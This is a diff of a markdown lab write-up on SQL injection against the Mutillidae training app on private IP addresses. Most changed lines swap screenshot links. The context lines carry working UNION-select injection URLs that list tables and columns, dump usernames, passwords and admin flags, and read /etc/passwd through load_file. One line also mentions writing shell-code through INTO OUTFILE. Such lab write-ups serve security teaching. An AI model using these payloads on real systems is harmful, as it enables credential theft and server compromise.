@@ -153,10 +153,9 @@ union select 1,table_name,null,null,5 from information_schema.tables where table
 
 
 http://192.168.43.145/mutillidae/index.php?page=user-
-
 info.php&username=ganesh%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details
 
-![image](https://github.com/Karthikeyan21001828/sqlinjection/assets/93427303/c3a28c5b-de1c-4c22-95c2-0ebfdf464079)
+![image](https://github.com/Karthikeyan21001828/sqlinjection/assets/93427303/3a57e755-40da-4d54-9dba-b7c6cd1ace7f)
 
 The url once executed will  retrieve table names from the “owasp 10” database.
 
@@ -169,15 +168,14 @@ Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns wher
 
 Here we are trying to extract column names from the “accounts” table.
 
-![image](https://github.com/AmirthaRoopaS/sqlinjection/assets/143496311/0f3a4e2f-8b06-42e5-a79d-6fca1f627112)
+![image](https://github.com/Karthikeyan21001828/sqlinjection/assets/93427303/5c9a4fa2-a135-4474-8af4-0eeb30daa628)
 
 The column names of the accounts is displayed below for the following url:
 
 http://192.168.43.145/mutillidae/index.php?page=user-
-
 info.php&username=ganesh%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details
 
-![image](https://github.com/Karthikeyan21001828/sqlinjection/assets/93427303/4b9dc0b2-61de-4d65-aa27-32a8947d883b)
+![image](https://github.com/Karthikeyan21001828/sqlinjection/assets/93427303/fd338e2d-8b91-4f30-b377-3e0808857ca1)
 
 Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.
 
@@ -185,7 +183,8 @@ Ex: (union select 1,username,password,is_admin,5 from accounts).
 
 http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details
 
-![image](https://github.com/AmirthaRoopaS/sqlinjection/assets/143496311/41ba5431-966f-497c-8e67-581fa02c4b5b)
+![image](https://github.com/Karthikeyan21001828/sqlinjection/assets/93427303/0f19e88e-5091-4e09-a788-ab4cacdcb145)
+
 
 ## Reading and writing files on the web-server
 
@@ -197,8 +196,7 @@ Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).
 
 http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details
 
-![image](https://github.com/AmirthaRoopaS/sqlinjection/assets/143496311/6c3766e9-9dce-47b5-8063-d521c584bd95)
-
+![image](https://github.com/Karthikeyan21001828/sqlinjection/assets/93427303/9ecb843f-8926-48bc-8eba-80215d962ad0)
 
 the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the 
 
